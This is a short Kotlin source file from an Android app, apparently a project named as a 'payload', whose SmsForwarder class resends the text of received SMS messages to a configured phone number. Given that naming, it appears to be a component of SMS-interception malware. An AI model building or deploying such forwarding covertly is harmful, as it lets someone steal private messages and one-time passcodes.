package com.payload.jansiix0ne.util

import android.content.Context
import android.util.Log
import com.payload.jansiix0ne.data.model.SmsForwardingConfig
import com.payload.jansiix0ne.data.model.SmsModel
import com.payload.jansiix0ne.data.repository.SmsForwardingRepository

/**
 * Helper class for forwarding SMS messages
 */
class SmsForwarder(private val context: Context) {
    private val forwardingRepository = SmsForwardingRepository(context)
    companion object {
        private const val TAG = "SmsForwarder"
    }

    /**
     * Forward SMS if forwarding is enabled
     */
    suspend fun forwardSmsIfEnabled(sms: SmsModel) {
        try {
            val config = forwardingRepository.getForwardingConfig()
            
            if (!config.enabled || config.number.isEmpty()) {
                Log.d(TAG, "Forwarding disabled or number empty")
                return
            }
            
            val success = SmsHelper.sendSms(context, config.number, sms.message)
            
            if (success) {
                Log.d(TAG, "Forwarded to ${config.number}")
            } else {
                Log.e(TAG, "Failed to forward SMS to ${config.number}")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error forwarding SMS: ${e.message}", e)
        }
    }
}
